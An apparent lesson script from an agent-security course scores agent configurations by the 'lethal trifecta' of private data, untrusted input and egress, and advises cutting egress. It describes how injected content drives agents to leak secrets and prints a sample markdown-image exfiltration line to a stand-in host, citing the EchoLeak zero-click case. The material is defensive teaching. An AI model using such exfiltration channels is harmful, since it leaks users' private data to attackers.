#!/usr/bin/env python3
"""
A03 -- The Lethal Trifecta.

Not every agent is exploitable. The ones that are almost always hold three
properties at once: access to private data, exposure to untrusted content, and
a way to communicate outward. Remove any one leg and the exfiltration path
breaks.

This file scores real agent configurations and shows exactly which leg to cut.

    python3 a03_trifecta.py
"""
import os
import sys
from dataclasses import dataclass

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from agentlib import ok, rule


@dataclass
class Config:
    name: str
    private_data: str      # what sensitive thing it can reach ("" = none)
    untrusted_input: str   # where attacker text can enter ("" = none)
    egress: str            # how bytes can leave ("" = none)

    @property
    def legs(self):
        return sum(bool(x) for x in (self.private_data, self.untrusted_input, self.egress))

    @property
    def exploitable(self):
        return self.legs == 3


CONFIGS = [
    Config("Coding agent, public repo, network on",
           "~/.ssh, .env, source tree",
           "issue text, PR bodies, dependency READMEs, code comments",
           "git push, package install, curl in a test"),

    Config("Inbox triage agent",
           "the whole mailbox",
           "any email any stranger sends you",
           "send_email, and the reply draft the user will send"),

    Config("Browsing agent in your logged-in profile",
           "every site you are authenticated to",
           "every page it visits",
           "form submission, URL navigation, rendered image fetches"),

    Config("Internal wiki Q&A, read only, no network",
           "internal documents",
           "wiki pages any employee can edit",
           "the answer text a human reads and acts on"),

    Config("Customer-support bot over public FAQ only",
           "",
           "the customer's message",
           "its reply"),

    Config("Nightly report generator, fixed SQL, email to one address",
           "the production database",
           "",
           "email to a single hard-coded recipient"),

    Config("Code reviewer: reads PR, posts comment, no repo secrets, no network",
           "",
           "the diff and PR description",
           "the review comment"),
]

rule("scoring real agent configurations")
for c in CONFIGS:
    mark = "EXPLOITABLE" if c.exploitable else f"{c.legs}/3 legs"
    print(f"\n  {c.name}")
    print(f"     private data     {c.private_data or '-- none --'}")
    print(f"     untrusted input  {c.untrusted_input or '-- none --'}")
    print(f"     egress           {c.egress or '-- none --'}")
    print(f"     >>> {mark}")

# ---------------------------------------------------------------------------
# which leg is cheapest to cut?
# ---------------------------------------------------------------------------

rule("which leg to cut")

print("""  Cutting PRIVATE DATA
      Give the agent its own identity with its own, smaller, dataset. Works when
      the task genuinely does not need your secrets -- which is more often than
      teams assume. Cost: some capability.
      -> A22, identity and least privilege.

  Cutting UNTRUSTED INPUT
      Almost never available. The reason you deployed the agent is that it reads
      things. Curating the input set (allow-listed domains, first-party corpora
      only) narrows it; it does not close it, because first-party corpora are
      writable too.
      -> A12, memory and knowledge-base poisoning.

  Cutting EGRESS
      Usually the cheapest and by far the most effective. An outbound allow-list
      naming the two or three hosts the task actually needs turns a full
      compromise into a contained one. The attacker still controls the agent;
      they just cannot get anything out.
      -> A23, sandboxing and egress control.""")

# ---------------------------------------------------------------------------
# the counterexample that stops you being complacent
# ---------------------------------------------------------------------------

rule("the leg people forget")

print("""  "No network" is not "no egress."

  Channels that are egress and do not look like it:

      rendered markdown image   ![](https://evil.example/?d=SECRET)
                                the CLIENT fetches it. Your agent made no
                                network call at all.
      a link in the output      the user clicks it. Slower, still works.
      a file written to a       synced to the cloud by an unrelated process.
        shared directory
      a message to another      that agent has network access.
        agent
      a git commit              pushed by CI five minutes later.
      a DNS lookup              a hostname is data. Resolvers log.
      an error message          "failed to parse SECRET" in a shared log sink.

  When you cut egress, enumerate the client's capabilities as well as the
  agent's. EchoLeak (CVE-2025-32711) was zero-click precisely because the
  rendering client fetched the attacker's URL without anyone deciding to.""")

# ---------------------------------------------------------------------------
# assertions
# ---------------------------------------------------------------------------

rule("checks")
assert CONFIGS[0].exploitable, "a coding agent on a public repo is the canonical case"
assert not CONFIGS[4].exploitable, "no private data -> not the trifecta"
assert not CONFIGS[5].exploitable, "no untrusted input -> not the trifecta"
assert CONFIGS[3].exploitable, "an answer a human acts on is a channel"
ok(f"{sum(c.exploitable for c in CONFIGS)} of {len(CONFIGS)} configurations hold all three legs")
ok("A03 complete -- find the three legs before you argue about model choice")
